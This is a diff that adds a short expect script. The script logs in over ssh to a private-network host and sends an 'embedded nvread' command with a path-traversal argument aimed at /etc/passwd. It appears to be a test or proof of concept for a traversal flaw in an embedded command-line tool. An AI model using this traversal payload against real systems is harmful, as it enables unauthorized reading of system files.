@@ -1,0 +1,11 @@
+#spawn ./trash
+spawn ssh user2@192.168.122.9
+expect "$ "
+send -- "nocomplete"
+sleep 1
+send -- "\r"
+sleep 1
+send -- "embedded nvread ../../../../../../../../etc/passwd"
+sleep 1
+send -- "\r"
+expect "embedded$ "
